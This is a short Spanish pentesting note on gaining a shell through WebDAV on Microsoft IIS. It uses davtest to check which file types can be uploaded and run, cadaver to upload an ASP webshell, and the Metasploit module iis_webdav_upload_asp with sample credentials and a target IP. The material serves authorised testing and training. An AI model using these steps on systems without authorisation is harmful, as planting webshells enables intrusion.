# Microsoft IIS / WebDAV

## File Upload Abusing

En base a ciertas posibles configuraciones en WebDAV. Con credenciales validas, podremos subir archivos y explotarlos, de esta manera obtendremos acceso a la maquina.

En primer lugar necesitamos saber que tipos de archivos son permitidos subir y ejecutar. Sobre todo nos interesa PHP, ASP, ASPX, JSP. Para comprobar los archivos ejecutables, usaremos la herramienta davtest. En este caso si no hay autenticación:

```bash
davtest -url http://192.168.1.1/webdav
```

Si necesitamos credenciales especificas:

```bash
davtest -auth usuario:contraseña -url http://192.168.1.1/webdav
```

Por lo tanto se suben los archivos:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y comprueba si se pueden ejecutar:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Cadaver

Ahora, usaremos la herramienta cadaver para subir y descargar archivos del WebDAV.&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Subimos una webshell. Elegimos una escrita en asp:

```bash
/usr/share/webshells/asp/webshell.asp
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Accedemos:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Metasploit

Podemos usar metasploit para subir la web shell:

```perl
msfconsole

use exploit/windows/iis/iis_webdav_upload_asp

set RHOSTS 10.0.17.27

set HttpUsername bob

set HttpPassword password_123321

set PATH /webdav/metasploit%RAND%.asp

exploit
```

